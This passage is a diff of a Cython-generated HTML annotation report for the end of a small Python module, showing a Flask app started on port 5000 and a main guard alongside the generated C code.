+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">124</span>:     <span class="k">print</span><span class="p">(</span><span class="s">&quot;🔥 Local server running on http://localhost:5000&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_2 = NULL;
   __pyx_t_5 = 1;
   {
@@ -2872,8 +2947,8 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">125</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">126</span>:     # Run Flask server</pre>
-<pre class="cython line score-27" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">127</span>:     app.run(host="0.0.0.0", port=5000)</pre>
+<pre class="cython line score-0">&#xA0;<span class="">126</span>:     <span class="c"># Run Flask server</span></pre>
+<pre class="cython line score-27" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">127</span>:     <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mf">5000</span><span class="p">)</span></pre>
 <pre class='cython code score-27 '>  __pyx_t_2 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 127, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
@@ -2907,8 +2982,8 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">128</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">129</span>: # Optional top-level run</pre>
-<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">130</span>: if __name__ == "__main__":</pre>
+<pre class="cython line score-0">&#xA0;<span class="">129</span>: <span class="c"># Optional top-level run</span></pre>
+<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">130</span>: <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span></pre>
 <pre class='cython code score-5 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_name);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 130, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_11 = (<span class='pyx_c_api'>__Pyx_PyUnicode_Equals</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_main, Py_EQ)); if (unlikely((__pyx_t_11 &lt; 0))) <span class='error_goto'>__PYX_ERR(0, 130, __pyx_L1_error)</span>
@@ -2916,7 +2991,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   if (__pyx_t_11) {
 /* … */
   }
-</pre><pre class="cython line score-7" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">131</span>:     main()</pre>
+</pre><pre class="cython line score-7" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">131</span>:     <span class="n">main</span><span class="p">()</span></pre>
 <pre class='cython code score-7 '>    __pyx_t_5 = NULL;
     <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_10, __pyx_mstate_global-&gt;__pyx_n_u_main_2);<span class='error_goto'> if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 131, __pyx_L1_error)</span>
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_10);
